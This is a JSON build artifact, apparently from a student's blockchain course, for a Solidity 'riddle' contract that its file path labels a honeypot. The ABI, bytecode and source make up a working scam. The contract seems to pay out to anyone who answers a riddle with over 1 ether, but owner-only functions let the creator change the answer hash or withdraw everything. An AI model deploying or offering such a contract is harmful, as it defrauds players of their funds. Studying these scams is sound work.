{
  "contractName": "G_GAME",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "StartGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106aa806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631f1c827f1461006f5780633e3ee859146101115780633fad9ae01461017b578063648f0bde1461020b578063f50ab24714610239575b005b61010f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610243565b005b610179600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061031f565b005b34801561018757600080fd5b506101906103a1565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101d05780820151818401526020810190506101b5565b50505050905090810190601f1680156101fd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61023760048036038101908080359060200190820180359060200191909192939192939050505061043f565b005b61024161051d565b005b600060010260025460001916141561031b57806040518082805190602001908083835b60208310151561028b5780518252602082019150602081019050602083039250610266565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906102d89291906105d9565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561037b57600080fd5b81600090805190602001906103919291906105d9565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104375780601f1061040c57610100808354040283529160200191610437565b820191906000526020600020905b81548152906001019060200180831161041a57829003601f168201915b505050505081565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561047957600080fd5b818160405180838380828437820191505092505050604051809103902060001916600254600019161480156104b55750670de0b6b3a764000034115b15610519573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610517573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561057957600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156105d6573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061061a57805160ff1916838001178555610648565b82800160010185558215610648579182015b8281111561064757825182559160200191906001019061062c565b5b5090506106559190610659565b5090565b61067b91905b8082111561067757600081600090555060010161065f565b5090565b905600a165627a7a7230582027919d37d4ebac9dc6c77cfef7cb52c3e24c5f3594770bd37eab72b59810e3470029",
  "source": "/**\n *Submitted for verification at Etherscan.io on 2018-05-08\n https://etherscan.io/address/0x3CAF97B4D97276d75185aaF1DCf3A2A8755AFe27#codepragma\n*/\n\npragma solidity ^0.4.20;\n\ncontract G_GAME\n{\n    function Play(string _response)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        if(responseHash == keccak256(_response) && msg.value>1 ether)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    string public question;\n \n    address questionSender;\n  \n    bytes32 responseHash;\n \n    function StartGame(string _question,string _response)\n    public\n    payable\n    {\n        if(responseHash==0x0)\n        {\n            responseHash = keccak256(_response);\n            question = _question;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function StopGame()\n    public\n    payable\n    {\n       require(msg.sender==questionSender);\n       msg.sender.transfer(this.balance);\n    }\n    \n    function NewQuestion(string _question, bytes32 _responseHash)\n    public\n    payable\n    {\n        require(msg.sender==questionSender);\n        question = _question;\n        responseHash = _responseHash;\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/Users/student/Desktop/work/blockchainIntro/honeypot/contracts/riddleHoneypot.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "3.3.4",
  "updatedAt": "2021-04-15T18:55:59.780Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}